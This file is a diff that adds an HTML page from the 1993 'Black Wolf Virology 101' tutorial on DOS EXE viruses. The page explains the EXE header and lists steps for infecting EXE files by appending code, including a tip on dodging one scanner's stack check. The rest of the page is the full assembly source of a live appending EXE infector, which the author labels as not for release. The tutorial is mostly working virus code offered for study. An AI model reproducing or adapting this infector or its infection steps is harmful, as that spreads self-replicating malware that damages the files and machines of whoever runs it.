@@ -1,0 +1,354 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Black Wolf Virology 101 - EXE Viruses</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<UL>
+<UL>
+<UL>
+<UL>
+<UL>
+<UL>
+<P><B><FONT COLOR="#004080"><FONT SIZE=+2>EXE Viruses</FONT></FONT></B></P>
+</UL>
+</UL>
+</UL>
+</UL>
+</UL>
+</UL>
+
+<P>
+<HR WIDTH="100%"></P>
+
+<UL>
+<PRE>        COM files are generally only written as quick utilities or as
+    pieces of an operating system - especially today, they just aren't
+    practical for large applications.  Because of this, they provide a
+    rather limited medium over which a virus can spread.  EXE files,
+    however, are more common in most DOS-based systems and offer
+    viruses a better chance of survival.  Infecting EXE files,
+    however, is a little more complex than infecting COM's.  Let us
+    first take a look at exactly how an EXE is structured.
+
+         First off, unlike the COM files, EXE's are NOT a direct
+    memory image of the program.  At the start of their code in a file,
+    they have what is called the EXE Header.  This header is used to
+    tell DOS things like where execution should start within the file
+    (not necessarily at the beginning), where the stack should be, etc.
+    After the header is what's called the Relocation Table.  In most
+    small .EXE files, this is empty.  For any .EXE larger than 64k,
+    and several below, this table plays a vital part in loading.  The
+    way it works is this:  When DOS executes an EXE, it chooses the
+    first free segment in memory.  Then, like with COM's, it loads the
+    PSP into that segment.  Unlike COM's, with EXE files DOS adds 10h
+    to CS, leaving ES and DS to point at the PSP segment.  This means
+    that the the program (excluding header) begins at CS:0000, where
+    the PSP is set at [CS-10h]:0000.  After the initial loading, it
+    still must make use of the relocation table.  The relocation table
+    stores a list of pointers, each pointing to an address within the
+    program.  At each of these addresses is one of several absolute
+    addressing commands that need to be adjusted for the segment that
+    DOS initiates the program at.  DOS goes through this table and adds
+    the beginning segment of the program to each address.
+
+    For example, in a file there is the following command:
+                    JMP     0000:0123
+
+         The file is loaded with the PSP at 10AB:0000 in memory,
+    making the program start at 10BB:0000.  After relocation by DOS,
+    the command reads the following:
+                    JMP     10BB:0123
+
+          An important thing to remember is that only the commands
+    indicated in the relocation table will be changed in this method.
+    This means you can just write a virus in one segment, avoiding any
+    far calls within the code (except to static locations - DOS,
+    for example).  Some, however, do wish to use far calls and must
+    modify the relocation table.
+
+          Now that we've looked at basically how DOS loads EXE files,
+    let's take a closer look at the EXE header, as it is the most
+    important part for viruses.  The structure is as follows:
+
+                          EXE Header Format
+    .---------------------------.-------------------------------------.
+    |00     EXE Signature       | Usually 'MZ' but can be 'ZM'        |
+    |02     Length of Last Page | In bytes                            |
+    |04     Size of File        | In 512 byte pages, rounded up.      |
+    |06     # of Rel. Tbl. Items|                                     |
+    |08     Size of EXE Header  | 16 byte paragraphs.                 |
+    |0A     MINALLOC            | Minimum memory allocated to file    |
+    |0C     MAXALLOC            | Maximum memory allocated to file    |
+    |0E     Initial SS          | Initial stack segment, relative to  |
+    |                           |    the beginning of the file.       |
+    |10     Initial SP          | Initial offset of stack pointer     |
+    |12     Negative Checksum   | Generally unused - Good place       |
+    |                           |    for ID bytes (overused though)   |
+    |14     Initial IP          | Initial execution offset            |
+    |16     Initial CS          | Initial execution segment, relative |
+    |                           |      to start of program.           |
+    |18     First Reloc. Item   | Pointer to relocation table         |
+    |1A     Overlay Number      | Overlay Marker                      |
+     ---------------------------.-------------------------------------
+         To infect an .EXE file using the generic appending method, one
+    must do the following:
+
+            1.)  Make sure it is an .EXE file, not just misnamed,
+                 by checking the ID signature for 'MZ'.
+
+            2.)  Store important registers from header that will
+                 be changed such as CS, IP, SS, and SP.
+
+            2.)  Append the code to the end.
+
+            3.)  Set CS:IP to point to viral code.
+
+            4.)  Set SS:SP to be a viable location - make sure that
+                 you aren't going to push data over yourself or the
+                 host program!  This is also a good place to set
+                 predictable values (in SP) for infection marking.
+                 (NOTE: TBSCAN and some others check for odd-
+                        numbered stacks when looking for viruses.)
+
+            5.)  Recalculate the file size.  Store as pages (rounding
+                 up) at offset 04 in header, then store the number
+                 of bytes in the last page at offset 02.
+
+            6.)  If you are using far calls within code that need to
+                 be adjusted by the relocation table (NOT recommended)
+                 then the addresses should be added to the reloc.
+                 table at this point.  BE SURE THAT THERE IS ENOUGH
+                 SPACE IN THE TABLE, OR ENLARGE THE TABLE!  Also,
+                 adjust the &quot;# of relocation table items&quot; field
+                 appropriately.  Notice that doing all this is
+                 a pain and generally not all that useful.
+
+            7.)  Restore control to Host by resetting stack to original
+                 value, then setting CS:IP to point to old starting
+                 point.  MAKE SURE TO SET ES AND DS TO POINT AT PSP.
+                 Also remember that the returning CS and SS must be
+                 adjusted by adding ES+10 to each.
+
+         Now that we have learned the basics, let's check out the next
+    virus. It is also a direct-action infector, but this one infects
+    only EXE files.  Notice that the code is based on the direct-action
+    COM file presented earlier.
+
+
+    ;     This file is a direct-action appending .EXE infector
+    ;written in TASM - compatible assembler for the IBM PC.
+    ;It is presented as a part of VIROLOGY 101 (c) 1993 Black Wolf.
+    ;It is a live virus, and should NOT be released.  Please execute
+    ;the virus only on isolated machines under controlled conditions.
+
+    .model tiny
+    .radix 16                               ;Default into Hexidecimal
+    .code
+            org 100
+    start:
+            push    ds                      ;Save old offset
+
+            push    cs cs                   ;Set ES = DS = CS
+            pop     es ds                   ;for data accessing.
+
+            call    get_offset              ;This places the displace-
+    get_offset:                             ;ment of the virus from
+            pop     bp                      ;its original compilation
+            sub     bp,offset get_offset    ;into BP.
+
+    Reset_Variables:                        ;Reset Old_XX values for
+            lea     di,[Store_IP+bp]        ;new infection.
+            lea     si,[Old_IP+bp]
+            movsw
+            movsw
+            movsw
+            movsw
+
+    Set_DTA:
+            lea     dx,[New_DTA+bp]         ;Set DTA to the after
+            mov     ah,1a                   ;virus
+            int     21
+
+            mov     ah,4e
+            xor     cx,cx                   ;Look only for normal
+                                            ;attribs
+            lea     dx,[File_Mask+bp]       ;Search for all files
+                                            ;matching '*.COM'
+    Find_File:
+            int     21
+            jc      No_More_Files
+
+            mov     ax,3d02
+            lea     dx,[New_DTA+1e+bp]      ;offset 1eh in DTA =
+                                            ;filename
+            int     21                      ;Open file for read/write
+                                            ;access
+            xchg    bx,ax                   ;Put File handle into BX
+
+            mov     ah,3f
+            mov     cx,1a
+            lea     dx,[exe_header+bp]      ;Read in EXE header.
+            int     21
+
+            cmp     word ptr [exe_header+bp],'ZM' ;Standard EXE mark.
+            jne     close_file                        ;Quit, misnamed
+            cmp     byte ptr [exe_header+bp+12],'V'   ;Check infection
+            je      close_file                        ;mark in checksum
+                                                      ;field.
+            call    Save_Old_Header
+
+            mov     ax,4202                 ;Go to the end of the file.
+            xor     cx,cx                   ;This function returns
+            xor     dx,dx                   ;file size into
+            int     21                      ;DX:AX
+
+            push    ax dx
+
+            call    calculate_CSIP          ;calculate starting
+                                            ;point.
+
+            pop     dx ax                   ;DX:AX = uninfected
+                                            ;file size.
+
+            call    calculate_size          ;calculate file size for
+                                            ;header
+
+            mov     ah,40                   ;Write virus to the end
+            mov     cx,end_virus-start      ;of the file.
+            lea     dx,[bp+start]
+            int     21
+
+            mov     ax,4200                 ;Return to the beginning
+            xor     cx,cx                   ;of the file.
+            xor     dx,dx
+            int     21
+
+            mov     ah,40                   ;Write header to the
+            mov     cx,1a                   ;beginning of file.
+            lea     dx,[bp+exe_header]
+            int     21
+
+            mov     ah,3e
+            int     21
+            jmp     No_More_Files           ;Only infect one each time
+
+    Close_File:                             ;Close current file
+            mov     ah,3e
+            int     21                      ;Close file, then
+                                            ;go to find another
+    Find_Next_File:                         ;file.
+            mov     ah,4f
+            jmp     Find_File
+
+    No_More_Files:          ;Reset DTA to original location
+            pop     ds      ;Get PSP segment
+            mov     dx,80
+            mov     ah,1a
+            int     21
+
+    Restore_To_Host:
+            push    ds              ;Restore ES = DS = PSP
+            pop     es
+
+            mov     ax,es
+            add     ax,10           ;add ajustment for PSP
+
+            add     word ptr cs:[Store_CS+bp],ax ;Adjust old CS by
+                                                 ;current seg
+            cli
+            add     ax,word ptr cs:[bp+Store_SS] ;Adjust old SS
+            mov     ss,ax                        ;Restore stack to
+            mov     sp,word ptr cs:[bp+Store_SP] ;original position
+            sti
+
+            db      0ea     ;Simulate far jump to Store_CS:Store_IP
+    Store_IP        dw      0
+    Store_CS        dw      0
+    Store_SP        dw      0
+    Store_SS        dw      0
+
+
+    Old_IP  dw      0
+    Old_CS  dw      0fff0           ;Initially points to an
+    Old_SP  dw      0               ;INT 20 in PSP for first
+    Old_SS  dw      0fff0           ;run.
+
+    Save_Old_Header:
+            mov     ax,word ptr [exe_header+bp+0e]    ;Save old SS
+            mov     word ptr [Old_SS+bp],ax
+            mov     ax,word ptr [exe_header+bp+10]    ;Save old SP
+            mov     word ptr [Old_SP+bp],ax
+            mov     ax,word ptr [exe_header+bp+14]    ;Save old IP
+            mov     word ptr [Old_IP+bp],ax
+            mov     ax,word ptr [exe_header+bp+16]    ;Save old CS
+            mov     word ptr [Old_CS+bp],ax
+            ret
+
+    calculate_CSIP:
+            push    ax
+            mov     ax,word ptr [exe_header+bp+8]   ;Get header length
+            mov     cl,4                            ;and convert it to
+            shl     ax,cl                           ;bytes.
+            mov     cx,ax
+            pop     ax
+
+            sub     ax,cx                           ;Subtract header
+            sbb     dx,0                            ;size from file
+                                                    ;size for memory
+                                                    ;adjustments
+
+            mov     cl,0c                           ;Convert DX into
+            shl     dx,cl                           ;segment Address
+            mov     cl,4
+            push    ax                      ;Change offset (AX) into
+            shr     ax,cl                   ;segment, except for last
+            add     dx,ax                   ;digit.  Add to DX and
+            shl     ax,cl                   ;save DX as new CS, put
+            pop     cx                      ;left over into CX and
+            sub     cx,ax                   ;store as the new IP.
+            mov     word ptr [exe_header+bp+14],cx
+            mov     word ptr [exe_header+bp+16],dx  ;Set new CS:IP
+            mov     word ptr [exe_header+bp+0e],dx  ;Set new SS = CS
+            mov     word ptr [exe_header+bp+10],0fffe ;Set new SP
+            mov     byte ptr [exe_header+bp+12],'V' ;mark infection
+            ret
+
+    calculate_size:
+            push    ax                      ;Save offset for later
+
+            add     ax,end_virus-start      ;Add virus size to DX:AX
+            adc     dx,0
+
+            mov     cl,7
+            shl     dx,cl                   ;convert DX to pages
+            mov     cl,9
+            shr     ax,cl
+            add     ax,dx
+            inc     ax
+            mov     word ptr [exe_header+bp+04],ax  ;save # of pages
+
+            pop     ax                              ;Get offset
+            mov     dx,ax
+            shr     ax,cl                           ;Calc remainder
+            shl     ax,cl                           ;in last page
+            sub     dx,ax
+            mov     word ptr [exe_header+bp+02],dx ;save remainder
+            ret
+
+    File_Mask       db     '*.EXE',0     ;File mask used for search
+    end_virus:
+
+    exe_header      db      1a dup (?)
+    New_DTA:
+    end start</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
